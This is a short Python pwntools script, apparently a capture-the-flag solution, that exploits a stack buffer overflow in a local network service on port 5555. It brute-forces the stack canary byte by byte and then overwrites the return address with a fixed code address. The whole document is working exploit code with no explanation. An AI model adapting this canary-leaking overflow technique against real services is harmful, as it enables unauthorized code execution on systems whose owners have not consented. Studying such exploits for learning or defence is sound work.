from pwn import *

def leak_canary():
	global canary
	canary = "\x00"
	while len(canary) < 8:
		for x in xrange(256):
			io = remote("127.0.0.1", 5555)
			io.recv()

			io.send("A"*104 + canary + chr(x))
			try:
				io.recv()
				canary += chr(x)
				break
			except:
				continue
			finally:
				io.close()
	log.info("canary: 0x%s" % canary.encode('hex'))

def pwn():
	io = remote("127.0.0.1", 5555)
	io.recv()

	io.send("A"*104 + canary + "A"*8 + p64(0x400bc6))
	print io.recvline()

if __name__=='__main__':
	leak_canary()
	pwn()

